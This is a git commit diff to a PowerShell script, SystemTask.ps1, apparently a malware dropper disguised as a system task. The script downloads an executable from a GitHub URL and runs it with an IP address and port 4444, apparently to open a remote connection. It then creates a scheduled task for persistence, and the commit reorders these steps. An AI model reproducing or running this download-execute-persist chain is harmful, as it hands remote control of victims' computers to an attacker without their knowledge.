a5f1aaf2428c5f17c8411394238f73d8e6e64081
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2016-12-07 22:28:30 +0700

    Update SystemTask.ps1

--- SystemTask.ps1
+++ SystemTask.ps1
@@ -5,6 +5,6 @@ $client.DownloadFile($url,$file)
 $url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
 $file = 'SystemTask.exe'
 $client.DownloadFile($url,$file)
-SystemTask.exe "192.168.149.1" "4444"
-$command = 'schtasks.exe /create /tn "SystemTask" /xml SystemTask.xml'
+$command = 'SystemTask.exe 192.168.149.1 4444'
 iex $command
+schtasks.exe /create /tn "SystemTask" /xml SystemTask.xml
